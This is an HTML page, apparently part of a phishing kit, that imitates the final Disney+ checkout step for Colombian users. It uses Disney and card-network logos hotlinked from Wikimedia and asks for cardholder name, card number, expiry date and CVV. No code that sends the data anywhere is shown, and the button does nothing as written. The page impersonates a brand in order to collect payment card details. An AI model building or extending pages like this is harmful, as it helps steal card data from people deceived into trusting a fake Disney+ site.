<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Paso 3 | Disney+</title>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">

<style>
body {
    margin: 0;
    background: #0f0f0f;
    font-family: 'Inter', sans-serif;
    color: #fff;
}

/* HEADER */
header {
    padding: 20px;
    display: flex;
    justify-content: space-between;
    align-items: center;
}

header img {
    height: 34px;
}

header a {
    color: #bbb;
    font-size: 15px;
    text-decoration: none;
}

/* CONTENEDOR PRINCIPAL */
.main-container {
    padding: 20px;
    max-width: 600px;
    margin: auto;
}

.step {
    font-size: 14px;
    color: #9ca3af;
}

h1 {
    font-size: 28px;
    margin-top: 5px;
    margin-bottom: 25px;
}

/* LABELS */
label {
    display: block;
    margin: 18px 0 6px;
    font-size: 14px;
    color: #d1d5db;
}

/* INPUTS */
input, select {
    width: 100%;
    padding: 15px;
    background: #1a1a1a;
    border: 1px solid #383838;
    border-radius: 6px;
    color: #fff;
    font-size: 15px;
    box-sizing: border-box;
}

/* TARJETA ICONOS */
.input-card {
    position: relative;
}

.card-icons {
    position: absolute;
    right: 12px;
    top: 50%;
    transform: translateY(-50%);
    display: flex;
    gap: 6px;
}

.card-icons img {
    height: 26px;
    opacity: .9;
}

/* FECHA + CVV */
.row-double {
    display: flex;
    gap: 15px;
}

.field-group {
    flex: 1;
}

/* CAJA DEL PRECIO */
#price-box {
    margin-top: 30px;
    background: #111;
    border: 1px solid #2e2e2e;
    padding: 18px;
    border-radius: 10px;
}


/* BOTÓN */
button {
    width: 100%;
    padding: 16px;
    margin-top: 20px;
    background: #fff;
    border: none;
    color: #000;
    border-radius: 30px;
    font-size: 17px;
    cursor: pointer;
    font-weight: 600;
}

button:hover {
    background: #e6e6e6;
}

/* FOOTER */
footer {
    margin-top: 50px;
    padding: 40px 20px;
    background: #0d0d0d;
    text-align: center;
    color: #7e7e7e;
    font-size: 13px;
}
</style>
</head>

<body>

<header>
    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3e/Disney%2B_logo.svg">
    <a href="#">Cerrar sesión</a>
</header>

<div class="main-container">

    <div class="step">PASO 3 DE 3</div>
    <h1>¡A disfrutar!</h1>

    <!-- FORMULARIO -->
    <label>NOMBRE EN LA TARJETA</label>
    <input type="text" placeholder="Nombre del titular">

    <label>NÚMERO DE LA TARJETA</label>
    <div class="input-card">
        <input type="text" placeholder="•••• •••• •••• ••••" maxlength="19">
        <div class="card-icons">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/04/Mastercard-logo.png/1200px-Mastercard-logo.png">
            <img src="https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo_%282018%29.svg">
            <img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png">
        </div>
    </div>

    <div class="row-double">
        <div class="field-group">
            <label>FECHA DE VENCIMIENTO</label>
            <input type="text" placeholder="MM/AA" maxlength="5">
        </div>

        <div class="field-group">
            <label>CÓDIGO DE SEGURIDAD</label>
            <input type="text" placeholder="CVV" maxlength="4">
        </div>
    </div>

    <label>CIUDAD</label>
    <input type="text" placeholder="Ingrese su ciudad">

    <label>DEPARTAMENTO</label>
    <select>
        <option>Seleccionar…</option>
        <option>Antioquia</option>
        <option>Cundinamarca</option>
        <option>Valle del Cauca</option>
        <option>Atlántico</option>
        <option>Santander</option>
    </select>

    <label>RUT (OPCIONAL)</label>
    <input type="text" placeholder="Opcional">



    <!-- CAJA PRECIO -->
    <div id="price-box">
        <div style="color:#9ca3af; font-size:15px;">Total a pagar</div>

        <div id="finalPrice" style="
            margin-top: 6px;
            font-size: 26px;
            font-weight: 600;
            color: #00c8ff;">
        </div>

        <div id="planName" style="margin-top: 4px; font-size: 14px; color:#6b7280;"></div>

        <div id="planSummary" style="margin-top:12px; font-size:14px; line-height:1.4; color:#d1d5db;"></div>
    </div>


    <button>INICIAR SUSCRIPCIÓN</button>

</div>


<footer>
    © 2025 Disney+. Todos los derechos reservados.
</footer>


<script>
// CARGAR DATOS DEL PLAN
const planName  = localStorage.getItem("planName")  || "Plan no seleccionado";
const planPrice = localStorage.getItem("planPrice") || "0";
const planSummary = localStorage.getItem("planSummary") || "";

document.getElementById("finalPrice").innerText = "COP " + planPrice + "/mes";
document.getElementById("planName").innerText   = planName;
document.getElementById("planSummary").innerText = planSummary;
</script>

</body>
</html>
